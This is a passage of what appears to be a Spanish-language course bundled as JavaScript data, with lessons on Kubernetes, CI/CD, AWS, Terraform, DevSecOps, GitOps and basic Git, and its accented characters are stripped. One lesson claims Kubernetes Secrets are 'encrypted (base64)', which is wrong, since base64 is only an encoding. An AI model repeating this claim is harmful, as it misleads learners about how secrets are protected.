Tus pods estn corriendo, pero nadie puede entrar. Estn aislados en la red interna del cluster.

## 1. Service (La Puerta de Entrada)
Un objeto que agrupa tus Pods bajo una sola IP estable. Balancea la carga (Load Balancing) entre ellos.

Tipos de Servicios:
*   **ClusterIP:** Solo accesible desde dentro del cluster (Default). Para bases de datos internas.
*   **NodePort:** Abre un puerto en cada nodo del cluster (ej: 30000). Raro en produccin.
*   **LoadBalancer:** Pide un balanceador de carga real a tu proveedor Cloud (AWS ALB, Google LB). Te da una IP pblica real.

\`service.yaml\`:
\`\`\`yaml
apiVersion: v1
kind: Service
metadata:
  name: mi-servicio
spec:
  selector:
    app: mi-web # Debe coincidir con el label del Pod
  ports:
    - protocol: TCP
      port: 80 # Puerto del servicio
      targetPort: 80 # Puerto del contenedor
  type: LoadBalancer
\`\`\`

## 2. Ingress (El recepcionista inteligente)
Si tienes 50 microservicios, no quieres pagar 50 LoadBalancers.
Usas un **Ingress Controller** (como Nginx).
*   Un solo LoadBalancer para entrar.
*   Reglas de ruteo basadas en host o path.
    *   \`api.misitio.com\` -> Servicio API
    *   \`misitio.com/blog\` -> Servicio Blog

## 3. ConfigMaps y Secrets
Nunca pongas configuracin en tu imagen de Docker. Inyctala.
*   **ConfigMap:** Datos no confidenciales (URLs, colores, flags). Se montan como variables de entorno o archivos.
*   **Secret:** Datos confidenciales (Passwords, API Keys). Se guardan cifrados (base64) en K8s.

---

### Misin Semi-Senior:
1. Crea un \`Service\` tipo \`NodePort\` o \`LoadBalancer\` para tu deployment anterior.
2. Accede a tu Nginx desde tu navegador (localhost:puerto o IP).
3. Crea un ConfigMap con \`COLOR_FONDO=blue\`.
4. Modifica tu Deployment para leer esa variable de entorno (aunque Nginx no la use, verifica con \`kubectl exec\` que la variable existe dentro del pod).
`,completed:!1},{id:"devops-11-ci-cd-avanzado",title:"CI/CD Avanzado",level:"semi-senior",content:`# Leccin 11: CI/CD Avanzado (Pipeline Completo)

Vamos a profesionalizar el pipeline. No basta con que compile.

## 1. Estructura de un Pipeline Real
1.  **Lint:** Revisa estilo de cdigo. Falla rpido.
2.  **Test:** Unitarios y de Integracin.
3.  **Build:** Construye la imagen Docker.
4.  **Permisos/Seguridad:** Escaneo de vulnerabilidades.
5.  **Deploy Staging:** Despliega a un entorno de pruebas.
6.  **Tests E2E:** Cypress/Playwright contra Staging.
7.  **Deploy Produccin:** Solo si todo lo anterior pas.

## 2. GitHub Actions Secrets
Nunca pongas contraseas en \`ci.yml\`.
Ve a \`Settings > Secrets and variables > Actions\`.
Crea \`DOCKER_USERNAME\` y \`DOCKER_PASSWORD\`.

Uso en YAML:
\`\`\`yaml
- name: Login to Docker Hub
  uses: docker/login-action@v2
  with:
    username: \${{ secrets.DOCKER_USERNAME }}
    password: \${{ secrets.DOCKER_PASSWORD }}
\`\`\`

## 3. Artefactos y Cach
Para que el pipeline sea rpido:
*   **Cache:** Guarda \`node_modules\` entre ejecuciones para no instalar siempre desde cero.
*   **Artifacts:** Pasa archivos (ej: carpeta \`dist/\` o reportes de test) de un Job a otro.

---

### Misin Semi-Senior:
Mejora tu pipeline de GitHub Actions:
1.  Agrega un Job de Linting (ESLint).
2.  Configura Secretos para loguearte en Docker Hub.
3.  Si Test y Lint pasan, construye la imagen y sbela (Push) a Docker Hub con el tag \`latest\` y el SHA del commit.
`,completed:!1},{id:"devops-12-cloud-fundamentos",title:"Fundamentos Cloud (AWS)",level:"semi-senior",content:`# Leccin 12: Cloud Fundamentos (La Nube no es mgica)

La nube es simplemente usar la computadora de otro (Amazon, Google, Microsoft) y pagar por segundo.

## 1. Modelos de Servicio
*   **IaaS (Infrastructure as a Service):** Te alquilan el hardware virtual (CPU, Disco, Red). T instalas el OS y todo lo dems.
    *   Ej: AWS EC2, Google Compute Engine.
    *   *Control total, responsabilidad total.*
*   **PaaS (Platform as a Service):** Te dan la plataforma para correr tu cdigo. Ellos manejan el OS y parches.
    *   Ej: Heroku, AWS Elastic Beanstalk, Vercel.
    *   *Menos control, mayor velocidad.*
*   **SaaS (Software as a Service):** Usas el software terminado.
    *   Ej: Gmail, Salesforce, Jira.

## 2. AWS 101 (Amazon Web Services)
El lder del mercado. Conceptos bsicos:
*   **Region:** Ubicacin fsica (ej: \`us-east-1\` Virginia). Todo recurso vive en una regin.
*   **EC2 (Elastic Compute Cloud):** Servidores virtuales.
*   **S3 (Simple Storage Service):** Almacenamiento de objetos (archivos ilimitados). Como Dropbox para devs.
*   **IAM (Identity and Access Management):** Quin puede hacer qu. Usuarios y Roles. **Nunca uses tu usuario Root para trabajar.**

## 3. Seguridad en la Nube
Modelo de Responsabilidad Compartida:
*   AWS es responsable de la seguridad **DE** la nube (fsica, hardware).
*   T eres responsable de la seguridad **EN** la nube (tus datos, puertos abiertos, contraseas).

---

### Misin Semi-Senior:
Crea una cuenta gratuita en AWS (Free Tier).
1. Crea un usuario IAM con permisos de Administrador (no uses Root). Configura MFA (Autenticacin de 2 pasos).
2. Lanza una instancia EC2 (t2.micro - gratis).
3. Conctate por SSH e instala Nginx.
4. Abre el puerto 80 en el "Security Group" (Firewall).
5. Visita la IP pblica y ve tu servidor funcionando.
6. **IMPORTANTE:** Termina (Terminate) la instancia al acabar para no gastar saldo.
`,completed:!1},{id:"devops-13-terraform-intro",title:"IaC con Terraform",level:"semi-senior",content:`# Leccin 13: Infraestructura como Cdigo (Intro a Terraform)

Hacer click en la consola de AWS es de amateurs. No es reproducible. Si borras todo por error, cmo lo recuperas?
IaC permite versionar tu infraestructura con Git.

## 1. Qu es Terraform?
Herramienta open-source que te permite definir infraestructura en archivos \`.tf\` y aplicarla en cualquier proveedor (AWS, Azure, GCP).

## 2. Flujo de Terraform
1.  **Write:** Escribes \`main.tf\`.
2.  **Init:** \`terraform init\`. Descarga los plugins del proveedor.
3.  **Plan:** \`terraform plan\`. Te muestra qu va a crear/borrar antes de hacerlo. (Modo simulacin).
4.  **Apply:** \`terraform apply\`. Ejecuta los cambios reales en la nube.

## 3. Ejemplo: Crear bucket S3

\`main.tf\`:
\`\`\`hcl
provider "aws" {
  region = "us-east-1"
}

resource "aws_s3_bucket" "mi_bucket" {
  bucket = "mi-bucket-unico-12345"
  
  tags = {
    Name        = "Mi bucket de Terraform"
    Environment = "Dev"
  }
}
\`\`\`

## 4. Estado (State File)
Terraform crea un archivo \`terraform.tfstate\`. Es su base de datos local para saber qu recursos administra. **Gurdalo como oro (y en remoto)!** Si lo pierdes, Terraform pierde el control de la infraestructura real.

---

### Misin Semi-Senior:
1. Instala Terraform.
2. Configura tus credenciales de AWS en tu terminal (\`aws configure\` o variables de entorno).
3. Escribe un archivo \`.tf\` para crear un archivo de texto local (provider "local") o un bucket S3 si te animas.
4. Ejecuta \`init\`, \`plan\` y \`apply\`.
5. Verifica que el recurso se cre.
6. Ejecuta \`terraform destroy\` para borrar todo limpiamente.
`,completed:!1},{id:"devops-14-monitoring-basico",title:"Monitoreo Bsico",level:"semi-senior",content:`# Leccin 14: Monitoring Bsico (Ojos en la oscuridad)

No puedes arreglar lo que no ves. El monitoreo te dice si tu sistema est vivo y sano.

## 1. Logs vs. Mtricas
*   **Logs:** Eventos discretos. Texto. "El usuario X fall login a las 10:00". Detalle forense.
*   **Mtricas:** Datos numricos en el tiempo. Series temporales. "Uso de CPU: 80%". Tendencias y alertas.

## 2. Elastic stack (ELK) vs Prometheus
*   **ELK (Elasticsearch, Logstash, Kibana):** El rey de los logs centrales. Buscas texto libre entre millones de lneas.
*   **Prometheus + Grafana:** El estndar para mtricas en Kubernetes.
    *   **Prometheus:** Recolecta (Scrape) mtricas de tus servicios cada X segundos.
    *   **Grafana:** Visualiza esas mtricas en dashboards bonitos.

## 3. Las 4 "Golden Signals" de Google
Qu monitorear si no sabes por dnde empezar:
1.  **Latencia:** Cunto tarda en responder?
2.  **Trfico:** Cuntas peticiones recibimos?
3.  **Errores:** Qu % de peticiones fallan (500s)?
4.  **Saturacin:** Cun "lleno" est el sistema (CPU/RAM)?

---

### Misin Semi-Senior:
Implementa logging estructurado en tu app Node.js.
1. En lugar de \`console.log("error")\`, usa una librera como \`winston\` o \`pino\`.
2. Configrala para que emita JSON.
   \`{"level": "info", "message": "Server started", "timestamp": "..."}\`
3. Los logs en JSON son legibles por mquinas y sistemas de monitoreo. Los logs de texto plano son basura difcil de procesar.
`,completed:!1},{id:"devops-15-proyecto-semi-senior",title:"Proyecto Final Semi-Senior",level:"semi-senior",content:`# Proyecto Final Nivel Semi-Senior: "Deploy Real con IaC y CI/CD"

Es hora de salir de localhost. Vas a desplegar en la nube usando las mejores prcticas.

## Objetivo
Desplegar una aplicacin containerizada en un entorno Cloud (AWS/DigitalOcean/Render) usando un pipeline automatizado.

## Requisitos Tcnicos

### 1. La App
Usa tu servidor web simple. Asegrate de que tenga:
*   \`Dockerfile\` optimizado (Multi-stage).
*   Logs en formato JSON.
*   Un endpoint \`/health\` que devuelva 200 OK (para el Load Balancer).

### 2. Infraestructura (Simulada o Real)
Opcin A (Real - Recomendada si tienes AWS):
*   Usa Terraform para crear un **EC2** y un **Security Group** (puerto 80 abierto).

Opcin B (Simulada/PaaS):
*   Despliegue en un servicio tipo Render/Railway usando su archivo de configuracin (Infrastructure as Code versin light).

### 3. El Pipeline (GitHub Actions)
El workflow debe:
1.  Correr Linter y Tests.
2.  Construir la imagen Docker.
3.  Pushear la imagen a Docker Hub (o GHCR).
4.  **Continuous Deployment:** Disparar el despliegue en el servidor.
    *   Si usas EC2: Conectarse por SSH y hacer \`docker pull\` y \`docker run\`.
    *   Si usas PaaS: Usar el Webhook de deploy.

## Entregable (Evaluacin)
*   URL pblica donde la app responda "Hola Mundo".
*   Repositorio con cdigo, Dockerfile y configuracin de CI/CD.
*   Captura de pantalla de tu Dashboard de monitoreo (o logs de la nube).

### Debugging Challenge (Bonus)
Rompe tu app a propsito (haz que \`/health\` devuelva 500).
Observa cmo el pipeline o el sistema de despliegue reacciona. Se detuvo el deploy? Te lleg una alerta? Escribe un post-mortem de 3 lneas.
`,completed:!1},{id:"devops-16-kubernetes-avanzado",title:"Kubernetes Avanzado",level:"senior",content:`# Leccin 16: Kubernetes Avanzado (Escalado y Gestin)

Ya lanzaste tu app. Ahora imagina que llegan 1 milln de usuarios. Tu cluster sobrevive?

## 1. HPA (Horizontal Pod Autoscaler)
El auto-escalado mgico. K8s monitorea el uso de CPU/RAM.
*   Si el consumo sube del 50%, crea ms Pods.
*   Si baja, mata Pods para ahorrar dinero.

\`\`\`yaml
apiVersion: autoscaling/v1
kind: HorizontalPodAutoscaler
metadata:
  name: mi-app-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: mi-app
  minReplicas: 2
  maxReplicas: 10
  targetCPUUtilizationPercentage: 50
\`\`\`

## 2. StatefulSets (Bases de Datos en K8s)
Los \`Deployments\` son para apps "stateless" (sin memoria). Si matas un pod, el nuevo es idntico.
Las Bases de Datos necesitan identidad. El nodo 1 es el "Primary", el 2 es "Replica".
*   **StatefulSet:** Garantiza orden de inicio (0 -> 1 -> 2) y persistencia de identidad.
*   Usa \`PVC\` (Persistent Volume Claim) para que cada rplica tenga su propio disco duro nube.

## 3. Helm (El gestor de paquetes)
Escribir YAMLs a mano es terrible. Helm es el "npm" de Kubernetes.
*   **Charts:** Paquetes preconfigurados (MySQL, Redis, Grafana).
*   **Comando:** \`helm install mi-redis bitnami/redis\`.
*   **Templating:** Permite usar variables en los YAMLs (\`{{ .Values.imageTag }}\`).

## 4. Arquitectura Distribuida
En produccin real, tu cluster puede abarcar mltiples zonas de disponibilidad (AZ) para resistir terremotos o cortes de fibra.
*   **Affinity/Anti-Affinity:** Reglas para decir "No pongas dos pods de mi app en el mismo nodo fsico" (para evitar que si cae el nodo, caiga toda la app).

---

### Misin Senior:
1. Instala el "Metrics Server" en tu cluster (necesario para HPA).
2. Configura un HPA para tu deployment.
3. Genera carga artificial (usa una herramienta como \`k6\` o \`hey\`).
4. Observa con \`kubectl get hpa -w\` cmo K8s crea nuevos pods automticamente bajo presin.
`,completed:!1},{id:"devops-17-arquitectura-cloud-avanzada",title:"Arquitectura Cloud Avanzada",level:"senior",content:`# Leccin 17: Arquitectura Cloud Avanzada (Alta Disponibilidad)

Disear sistemas que **nunca** caen (High Availability - HA).

## 1. Regiones y Zonas (AZ)
*   **Regin:** rea geogrfica (ej: USA East).
*   **Availability Zone (AZ):** Datacenter fsico aislado dentro de una regin. Si se inunda una AZ, la otra sigue viva.
*   **Regla de Oro:** Despliega siempre en al menos 2 AZs.

## 2. Load Balancers (ELB/ALB) y CDN
*   **Application Load Balancer (ALB):** Recibe el trfico y lo reparte entre tus servidores sanos. Hace "Health Checks". Si un servidor muere, deja de enviarle trfico.
*   **CDN (Content Delivery Network):** CloudFront, Cloudflare. Cach de tus archivos estticos (imgenes, JS) en cientos de servidores alrededor del mundo. Reduce la carga de tu backend en un 90%.

## 3. Microservicios vs Monolito
*   **Monolito:** Todo el cdigo en un solo binario. Fcil al inicio, difcil de escalar equipos grandes.
*   **Microservicios:** Pequeos servicios independientes (Users, Payments, Orders).
    *   *Ventaja:* Escalan independientemente (si Payments es lento, solo escalas Payments). Tecnologa agnstica (uno en Go, otro en Node).
    *   *Desventaja:* Complejidad brutal de red y trazabilidad.

## 4. Disaster Recovery (DR)
Qu pasa si AWS pierde toda la regin de Virginia?
*   **Backup & Restore:** Lento pero barato.
*   **Pilot Light:** Base de datos replicada en otra regin, servidores apagados.
*   **Multi-Region Active-Active:** Tu app corre en USA y Europa a la vez. Trfico se dirige por geolocalizacin. Carsimo y complejo, pero indestructible.

---

### Misin Senior:
Disea en un diagrama (Draw.io) una arquitectura para un e-commerce global:
1. Usa CloudFront (CDN) para el frontend.
2. Balanceador de Carga distribuyendo trfico a 2 AZs.
3. Base de Datos RDS con una "Read Replica" en otra zona.
4. Explica qu pasa si la Zona A se queda sin electricidad.
`,completed:!1},{id:"devops-18-devsecops",title:"DevSecOps",level:"senior",content:`# Leccin 18: DevSecOps (Seguridad Integrada)

La seguridad no es un equipo que revisa al final. Es parte del pipeline. "Shift Security Left".

## 1. Gestin de Secretos (Secrets Management)
El error #1: Subir API Keys a Git.
*   **Herramientas:** Vault (Hashicorp), AWS Secrets Manager, SOPS.
*   **En K8s:** Usa \`ExternalSecrets\` operator para sincronizar secretos de AWS hacia K8s automticamente. Nunca escribas base64 manual.

## 2. Escaneo de Vulnerabilidades (SCA & SAST)
*   **SCA (Software Composition Analysis):** Analiza tus libreras (\`node_modules\`). "Est usando una versin de 'axios' hackeada?".
    *   Herramienta: \`npm audit\`, \`Snyk\`, \`Trivy\`.
*   **SAST (Static Application Security Testing):** Analiza tu cdigo fuente. "Ests concatenando SQL manualmente? (Inyeccin SQL)".
    *   Herramienta: \`SonarQube\`, \`CodeQL\`.

## 3. Container Hardening
Los contenedores por defecto son inseguros.
*   Usa imgenes "Distroless" (sin shell, sin package manager). Solo tienen tu binario.
*   **Read-Only Root Filesystem:** Evita que un atacante modifique archivos del sistema.
*   **Non-Root User:** Obligatorio.

## 4. IAM Avanzado (Principle of Least Privilege)
Dale a cada servicio SOLAMENTE los permisos que necesita.
*   Tu Lambda necesita leer S3? Dale permiso \`s3:GetObject\` solo en ESE bucket. No le des \`s3:*\`.

---

### Misin Senior:
Vamos a hackear (y parchear) tu pipeline.
1. Integra **Trivy** en tu GitHub Action.
2. Haz que el pipeline FALLE si encuentra una vulnerabilidad "CRITICAL".
3. Intenta construir una imagen vieja (ej: \`node:10\`). El pipeline debera bloquearte el paso a produccin.
`,completed:!1},{id:"devops-19-observabilidad",title:"Observabilidad Completa",level:"senior",content:`# Leccin 19: Observabilidad Completa (Ms all de los logs)

Monitoring te dice "El sistema funciona". Observabilidad te permite preguntar "Por qu se rompi?".

## 1. Los 3 Pilares
1.  **Logs:** Eventos. (ELK, Loki).
2.  **Metrics:** Nmeros. (Prometheus, Datadog).
3.  **Traces:** El camino de una peticin.

## 2. Distributed Tracing (Jaeger / OpenTelemetry)
En microservicios, una peticin del usuario toca 10 servicios. Si falla, cul fue?
*   **Trace ID:** Un ID nico se genera en el Frontend y se pasa en los Headers HTTP a cada microservicio.
*   **Visualizacin:** Ves una cascada ("Waterfall") de tiempos. "Users tard 5ms, Payments tard 5000ms". Aqu est el problema!

## 3. Prometheus Avanzado (AlertManager)
No mires pantallas todo el da. Configura alertas.
*   "Si el % de errores 500 es > 1% por 5 minutos, manda alerta a Slack".
*   "Si el disco est al 90%, manda PagerDuty (despierta al ingeniero de guardia)".

## 4. Dashboards de Negocio
Grafana no es solo para CPU.
*   "Dinero procesado por minuto".
*   "Nuevos usuarios registrados".
*   Si las mtricas de negocio caen a cero, el sistema est roto aunque la CPU est bien.

---

### Misin Senior:
1. Levanta un stack de monitoreo local (Prometheus + Grafana + Loki) usando Docker Compose.
2. Instrumenta tu app para exponer mtricas en \`/metrics\` (formato Prometheus).
3. Crea un Dashboard en Grafana que muestre las peticiones por segundo (RPS) de tu app.
`,completed:!1},{id:"devops-20-gitops",title:"GitOps (ArgoCD)",level:"senior",content:`# Leccin 20: GitOps (ArgoCD)

Deja de hacer \`kubectl apply\` manualmente. Eso es peligroso y opaco. El estado del cluster debe reflejar exactamente el estado de Git.

## 1. Qu es ArgoCD?
Un agente que vive dentro de tu cluster Kubernetes.
*   Mira un repositorio Git ("config-repo").
*   Mira el estado actual del cluster.
*   Si son diferentes, **Sincroniza** (aplica los cambios automticamente).

## 2. Flujo GitOps
1.  Haces un cambio en el cdigo de la App. CI corre pruebas y pushea nueva imagen docker \`v2\`.
2.  CI hace un commit automtico al repo de configuracin: actualiza \`deployment.yaml\` para usar imagen \`v2\`.
3.  ArgoCD detecta el cambio en Git.
4.  ArgoCD actualiza el cluster.

## 3. Ventajas
*   **Auditabilidad:** Git log me dice quin cambi la infra, cundo y por qu.
*   **Revert:** Se rompi produccin? \`git revert\` en el repo de configuracin. ArgoCD revierte el cluster al estado anterior al instante.
*   **Seguridad:** Tus desarrolladores no necesitan acceso directo al cluster (kubectl). Solo necesitan permiso de Push a Git.

---

### Misin Senior:
(Terica/Prctica si tienes cluster):
Instala ArgoCD en tu cluster (o minikube).
1. Crea un repo Git simple con un YAML de Nginx.
2. Conecta ArgoCD a ese repo.
3. Cambia en Git el nmero de rplicas de 1 a 5.
4. Mira en ArgoCD cmo se sincroniza y aparecen los pods mgicamente.
`,completed:!1},{id:"devops-21-optimizacion-costos",title:"Optimizacin y Costos (FinOps)",level:"senior",content:`# Leccin 21: Optimizacin y Costos (FinOps)

La nube es infinita, tu tarjeta de crdito no. Un Senior cuida la billetera de la empresa.

## 1. Instancias Spot (Preemptible)
Servidores sobrantes que AWS te alquila con 90% de descuento.
*   **La trampa:** Te los pueden quitar con 2 minutos de aviso.
*   **Uso:** Para procesos batch, workers de cola, o nodos de K8s stateless. Nunca para Bases de Datos.

## 2. Dimensionamiento Correcto (Right Sizing)
*   No uses una instancia \`2xlarge\` (64GB RAM) si tu app usa 500MB.
*   Usa mtricas (Prometheus) para ver el uso real y ajusta los \`requests\` y \`limits\` en Kubernetes.

## 3. Serverless (Lambda)
Por qu pagar un servidor prendido 24/7 si solo tienes trfico de 9am a 5pm?
*   Serverless cobra por milisegundo de ejecucin. Si nadie visita tu sitio, pagas $0.

## 4. Cost Management
*   **Tags:** Etiqueta TODO (\`env=prod\`, \`team=payments\`).
*   **Presupuestos:** Configura alertas de facturacin. "Avsame si gasto ms de $50".
*   **Clean up:** Automatiza el borrado de recursos de desarrollo los fines de semana.

---

### Misin Senior:
Auditora de Costos Simulada.
Tienes un cluster con 10 nodos \`m5.large\` corriendo 24/7 al 10% de CPU.
Propn una estrategia para reducir la factura en un 50% sin afectar la disponibilidad.
(Pistas: HPA, Spot Instances, Auto-shutdown en dev).
`,completed:!1},{id:"devops-22-proyecto-final-senior",title:"Proyecto Final Senior DevOps",level:"senior",content:`# Proyecto Final Nivel Senior: "Arquitectura Empresarial Resiliente"

Vas a disear e implementar la infraestructura para un banco digital ficticio.

## Requerimientos

### 1. Arquitectura
*   **Microservicios:** Simula 2 servicios bsicos (\`api-gateway\`, \`auth-service\`).
*   **Alta Disponibilidad:** Deben correr en Kubernetes con al menos 2 rplicas cada uno.
*   **Ingress:** Acceso a travs de un Ingress Controller.

### 2. Pipeline DevSecOps
*   GitHub Actions workflow completo.
*   **CI:** Tests -> Lint -> Build Docker.
*   **Seguridad:** Escaneo de imagen con Trivy (debe bloquear vulnerabilidades crticas).
*   **CD (GitOps):** El pipeline no despliega directo. Actualiza un manifiesto en un repo de Git para que ArgoCD lo tome (simulado si no tienes ArgoCD: haz que el pipeline haga \`kubectl apply\` pero explica por qu no es ideal).

### 3. Observabilidad
*   Los servicios deben exponer mtricas Prometheus.
*   Dashboard de Grafana (JSON exportado) que muestre salud y trfico.
*   Alarmas configuradas (simuladas en documento).

### 4. Defensa Tcnica (Documento)
Escribe un \`ARCHITECTURE.md\` explicando:
*   Cmo manejas los secretos? (Vault/Secrets Manager).
*   Cmo escalas si el trfico se multiplica por 10? (HPA + Cluster Autoscaler).
*   Estrategia de Disaster Recovery?

## Evaluacin
Este proyecto demuestra que no solo saber "tirar comandos", sino que entiendes el ciclo de vida completo, la seguridad y la operacin del software a escala masiva. Eres un Ingeniero DevOps Senior!
`,completed:!1}]},f1={id:"diccionario",title:" Diccionario de Programacin",description:"Trminos y conceptos esenciales del desarrollo de software, arquitectura de sistemas y tecnologa, organizados por reas clave.",completed:!1,lessons:[{id:"diccionario-main",title:"Diccionario Completo",description:"Listado de trminos",completed:!1}]},h1={id:"git",title:"Git y GitHub Profesional",description:"Domina el control de versiones. De comandos bsicos a flujos de trabajo empresariales (Git Flow) y colaboracin en GitHub.",completed:!0,track:"Herramientas Esenciales",lessons:[{id:"git-01-que-es-git",title:"Qu es Git?",level:"junior",content:`# Leccin 1: Qu es Git? (Y por qu no es lo mismo que GitHub)

Bienvenido a la herramienta ms importante de tu carrera. Puedes ser un genio programando, pero si no sabes Git, no puedes trabajar en equipo.

## 1. El Problema: "Versin Final Real Definitiva.zip"
Antes de Git, guardar versiones de tu cdigo era un desastre:
*   \`proyecto_v1.zip\`
*   \`proyecto_v2_arreglado.zip\`
*   \`proyecto_v3_final_final.zip\`

Si queras volver a la v1, tenas que descomprimir y perder lo nuevo. Si dos personas editaban el mismo archivo a la vez... el caos.

## 2. La Solucin: Control de Versiones Distribuido (DVCS)
**Git** es un sistema que rastrea los cambios en los archivos.
*   **Historial:** Git recuerda cada cambio que has hecho en la historia del proyecto.
*   **Viaje en el tiempo:** Puedes volver a cualquier punto del pasado sin perder el futuro.
*   **Colaboracin:** Permite que mltiples personas trabajen en los mismos archivos sin sobrescribirse (la mayora de las veces).

## 3. Git vs. GitHub (La confusin clsica)
No son lo mismo. Es como comparar "Pornografa" con "Pornhub" (o MP3 con Spotify).
*   **Git:** Es el software que instalas en tu computadora. Funciona sin internet. Es la tecnologa.
*   **GitHub:** Es una pgina web (un servicio en la nube) donde subes tus repositorios de Git para compartirlos. Otros servicios son GitLab o Bitbucket.

## 4. Por qu es Distribuido?
En sistemas antiguos (SVN), haba un servidor central. Si el servidor caa, nadie poda trabajar.
En Git, **t tienes una copia completa de todo el historial en tu mquina**. Si GitHub desaparece maana, tu proyecto est a salvo en tu laptop.

---

### Misin Junior:
Instala Git en tu mquina si no lo tienes (\`git --version\` en la terminal). Configura tu identidad global (tu nombre y email) para que tus cambios tengan tu firma:
\`\`\`bash
git config --global user.name "Tu Nombre"
git config --global user.email "tu@email.com"
\`\`\`
Esto es tu "tarjeta de presentacin" en cada cambio.
`,completed:!0},{id:"git-02-repositorio",title:"Qu es un Repositorio?",level:"junior",content:`# Leccin 2: Qu es un Repositorio?

Un "repo" es simplemente una carpeta... con superpoderes.

## 1. La Carpeta Mgica \`.git\`
Cuando transformas una carpeta normal en un repositorio Git, se crea una carpeta oculta llamada \`.git\`.
*   **ADVERTENCIA:** JAMS toques nada dentro de esa carpeta manualmente. Es el cerebro de Git. Si la borras, pierdes todo el historial (pero no tus archivos actuales).

## 2. Los Tres Estados de Git
Para entender Git, debes entender dnde "viven" tus archivos.
1.  **Working Directory (Directorio de Trabajo):** Tu carpeta normal. Donde editas, borras y creas archivos. Es tu "presente".
2.  **Staging Area (rea de Preparacin / Index):** Un "limbo" donde colocas los archivos que *quieres* guardar en la prxima versin. Es como preparar la pose para una foto.
3.  **Repository (Repositorio / HEAD):** Donde Git guarda las "fotos" permanentes (commits) de tu proyecto. Es el historial inmutable.

## 3. Comandos Iniciales
Para empezar a usar Git en tu proyecto:

### git init
Convierte la carpeta actual en un repositorio nuevo.
\`\`\`bash
cd mi-proyecto
git init
\`\`\`
*(Se crea la carpeta oculta .git)*

### git clone
Descarga un repositorio completo desde internet (GitHub) a tu mquina.
\`\`\`bash
git clone https://github.com/usuario/proyecto.git
\`\`\`
Esto ya hace el \`init\` automticamente y trae todo el historial.

---

### Misin Junior:
Crea una carpeta nueva llamada \`laboratorio-git\`. Entra en ella y ejecuta \`git init\`. Observa si aparece la carpeta oculta \`.git\` (necesitars activar "ver archivos ocultos" en tu sistema operativo). Acabas de crear tu primer universo paralelo!
`,completed:!0},{id:"git-03-comandos-basicos",title:"Add, Commit y Status",level:"junior",content:`# Leccin 3: Add, Commit y Status (El Ciclo de Vida)

El 90% de tu tiempo en Git usars solo estos 3 comandos. Aprndelos de memoria.

## 1. git status (El Navegador)
Te dice en qu estado est tu proyecto.
*   Qu archivos modifiqu?
*   Qu archivos estn listos para guardarse?
*   Qu archivos son nuevos y Git no los conoce (Untracked)?

*Regla de oro:* Si ests perdido, escribe \`git status\`.

## 2. git add (Preparar la Foto)
Mueve los cambios del **Working Directory** al **Staging Area**.
Le dices a Git: *"Oye, quiero incluir este archivo en la prxima versin"*.

\`\`\`bash
# Agregar un archivo especfico
git add index.html

# Agregar TODO lo que cambi (muy comn)
git add .
\`\`\`

## 3. git commit (Tomar la Foto)
Mueve los cambios del **Staging Area** al **Repository**.
Crea un punto en la historia al que puedes volver.

\`\`\`bash
git commit -m "Agrega barra de navegacin al home"
\`\`\`

### El Mensaje de Commit
El \`-m "..."\` es vital.
*    \`git commit -m "cambios"\` (No dice nada. Te odiarn).
*    \`git commit -m "fix"\` (Qu arreglaste?).
*    \`git commit -m "Arregla error de validacin en el login"\` (Profesional).

## 4. El Flujo Completo
1.  Editas \`style.css\`.
2.  \`git status\` -> Muestra \`style.css\` en rojo (modificado).
3.  \`git add style.css\`.
4.  \`git status\` -> Muestra \`style.css\` en verde (listo para commit).
5.  \`git commit -m "Cambia color de fondo a azul"\`.
6.  \`git status\` -> "Working tree clean" (Todo guardado).

---

### Misin Junior:
En tu carpeta \`laboratorio-git\`:
1. Crea un archivo \`hola.txt\` con texto.
2. Usa \`git status\`.
3. Usa \`git add .\`
4. Haz tu primer commit: \`git commit -m "Primer commit: Creacin de hola.txt"\`.
5. Modifica el archivo y repite el proceso.
`,completed:!0},{id:"git-04-branches",title:"Branches (Ramas)",level:"junior",content:`# Leccin 4: Branches (Ramas) - El Multiverso

Imagina que puedes crear una copia paralela de tu proyecto para experimentar, y si rompes todo, no afecta al proyecto original. Eso son las Ramas.

## 1. La Rama Principal (main / master)
Por defecto, Git crea una rama llamada \`main\` (o \`master\` en versiones viejas).
*   Esta es la "verdad oficial" del proyecto.
*   **Regla:** Nunca hagas cambios experimentales directo en \`main\`.

## 2. Creando Ramas (Parallel Universes)
Cuando creas una rama, te separas de la lnea temporal principal. Puedes borrar archivos, romper cdigo, y \`main\` sigue intacto.

\`\`\`bash
# Crear una rama llamada "nueva-funcionalidad"
git branch nueva-funcionalidad

# Moverte a esa rama (activar ese universo)
git checkout nueva-funcionalidad
# o en versiones modernas de Git:
git switch nueva-funcionalidad
\`\`\`

**Atajo pro:** Crear y moverte en un solo comando:
\`\`\`bash
git checkout -b nueva-funcionalidad
\`\`\`

## 3. Por qu usar Ramas?
En un equipo profesional, cada tarea se hace en su propia rama:
*   \`feature/login-page\`
*   \`bugfix/header-alignment\`
*   \`experiment/new-colors\`

As, si la rama de Juan rompe el sitio, no afecta el trabajo de Mara ni el sitio en produccin.

---

### Misin Junior:
Ests en \`main\`.
1. Crea una rama \`feature/fondo-rojo\`.
2. Muvete a ella (\`git checkout feature/fondo-rojo\`).
3. Modifica tu archivo de texto para decir "Todo es Rojo".
4. Haz \`add\` y \`commit\`.
5. Vuelve a \`main\` (\`git checkout main\`).
6. Magia! El archivo vuelve a decir lo que deca antes. El cambio "Rojo" solo existe en la otra dimensin.
`,completed:!0},{id:"git-05-merge-basico",title:"Merge Bsico",level:"junior",content:'# Leccin 5: Merge Bsico (Unificando Dimensiones)\n\nCreaste una rama, hiciste cambios maravillosos y funcionan. Ahora quieres traer esos cambios de vuelta a la rama principal (`main`). Eso es un **Merge**.\n\n## 1. El Proceso de Fusin\nSiempre se hace desde la rama de *destino* (a donde quieres que lleguen los cambios).\n\n**Escenario:** Quieres traer los cambios de `feature/login` hacia `main`.\n\n1.  Muvete al destino:\n    ```bash\n    git checkout main\n    ```\n2.  Ejecuta el merge trayendo la otra rama:\n    ```bash\n    git merge feature/login\n    ```\n\n## 2. Tipos de Merge\n\n### A. Fast-Forward (El Sencillo)\nSi `main` no ha avanzado desde que creaste tu rama, Git simplemente "mueve el puntero" hacia adelante. El historial queda lineal. Es como si nunca te hubieras separado.\n\n### B. Merge Commit (La Unin Real)\nSi `main` avanz (alguien ms meti cambios) y tu rama tambin, Git crea un nuevo commit especial ("Merge Commit") para unir ambas historias. El historial muestra que hubo una bifurcacin.\n\n## 3. Conflictos (El Terror del Junior)\nQu pasa si en `main` alguien cambi la lnea 10 de `hola.txt` y t en tu rama cambiaste la MISMA lnea 